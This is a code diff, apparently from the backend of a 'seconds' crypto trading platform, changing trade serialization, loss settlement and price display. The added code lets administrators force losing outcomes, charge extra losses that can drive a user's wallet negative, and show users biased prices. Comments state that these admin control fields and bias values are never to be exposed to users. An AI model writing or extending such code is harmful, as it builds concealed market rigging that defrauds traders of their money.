@@ -74,16 +74,55 @@ const walletToObject = (wallet) => {
   return { ...wallet };
 };
 
-const serializeTrade = (t) => {
-  const doc = typeof t.toObject === "function" ? t.toObject() : t;
+/** Public user-facing trade payload — never leak admin control fields */
+const serializeTrade = (t, { forAdmin = false } = {}) => {
+  const doc = typeof t.toObject === "function" ? t.toObject() : { ...t };
   const now = Date.now();
   const expiresAt = new Date(doc.expiresAt).getTime();
   const remainingSec = Math.max(0, Math.ceil((expiresAt - now) / 1000));
-  return {
-    ...doc,
+
+  const base = {
+    _id: doc._id,
+    asset: doc.asset,
+    assetType: doc.assetType,
+    direction: doc.direction,
+    stake: doc.stake,
+    durationSec: doc.durationSec,
+    entryPrice: doc.entryPrice,
+    exitPrice: doc.exitPrice,
+    status: doc.status,
+    payout: doc.payout,
+    openedAt: doc.openedAt,
+    expiresAt: doc.expiresAt,
+    settledAt: doc.settledAt,
+    createdAt: doc.createdAt,
+    updatedAt: doc.updatedAt,
     remainingSec,
     isExpired: remainingSec <= 0 && doc.status === "open",
   };
+
+  // Settled wins may show natural profit % (not labeled as admin)
+  if (doc.status === "won" && doc.payoutPercent != null) {
+    base.payoutPercent = doc.payoutPercent;
+  }
+  // Settled losses: show loss amount only (stake / extra), never admin tags
+  if (doc.status === "lost") {
+    base.lossAmount = Number(doc.lossAmount || doc.stake || 0);
+  }
+
+  if (forAdmin) {
+    return {
+      ...base,
+      user: doc.user,
+      forcedOutcome: doc.forcedOutcome,
+      priceBiasPercent: doc.priceBiasPercent,
+      payoutPercent: doc.payoutPercent,
+      settleReason: doc.settleReason,
+      lossAmount: doc.lossAmount,
+    };
+  }
+
+  return base;
 };
 
 async function fetchLivePrice(asset) {
@@ -202,6 +241,26 @@ export async function settleTrade(tradeId, { exitPriceHint } = {}) {
       reviewerNote: `Seconds trade WIN (+${pct}% profit=$${(payout - trade.stake).toFixed(2)}) · ${reason}`,
     });
   } else {
+    // Stake already deducted at open. Forced loss % applies an additional
+    // deduction that MAY drive the Trading Wallet into negative territory.
+    let pct = 0;
+    let extraLoss = 0;
+    if (reason === "admin_force" || reason === "user_force_loss") {
+      const fromTrade = Number(trade.payoutPercent);
+      const fromUser = Number(user.tradeControlPercentage);
+      if (Number.isFinite(fromTrade) && fromTrade > 0) pct = fromTrade;
+      else if (Number.isFinite(fromUser) && fromUser > 0) pct = fromUser;
+      if (pct > 0) {
+        extraLoss = trade.stake * (pct / 100);
+        const bal = user.wallet.get("USDT") || 0;
+        user.wallet.set("USDT", bal - extraLoss);
+        user.markModified("wallet");
+        await user.save();
+      }
+    }
+    trade.payoutPercent = pct || trade.payoutPercent || 0;
+    trade.lossAmount = Number(trade.stake) + extraLoss;
+    payout = 0;
     await Transaction.create({
       user: user._id,
       kind: "trade",
@@ -210,7 +269,9 @@ export async function settleTrade(tradeId, { exitPriceHint } = {}) {
       amount: trade.stake,
       usdValue: 0,
       status: "completed",
-      reviewerNote: `Seconds trade LOSS (−$${Number(trade.stake).toFixed(2)}) · ${reason}`,
+      reviewerNote: `Seconds trade LOSS (−$${Number(trade.stake).toFixed(2)}${
+        extraLoss ? ` + extra −$${extraLoss.toFixed(2)} @ ${pct}%` : ""
+      }) · ${reason}`,
     });
   }
 
@@ -286,11 +347,18 @@ router.get(
 
     const merged = prices.map((p) => {
       const extra = tradeBias[p.asset] || 0;
-      if (!extra) return p;
+      if (!extra) {
+        // Never expose biasPercent to the user client
+        return {
+          asset: p.asset,
+          assetType: p.assetType,
+          price: p.price,
+        };
+      }
       const totalBias = p.biasPercent + extra;
       return {
-        ...p,
-        biasPercent: totalBias,
+        asset: p.asset,
+        assetType: p.assetType,
         price: applyBias(p.rawPrice, totalBias),
       };
     });
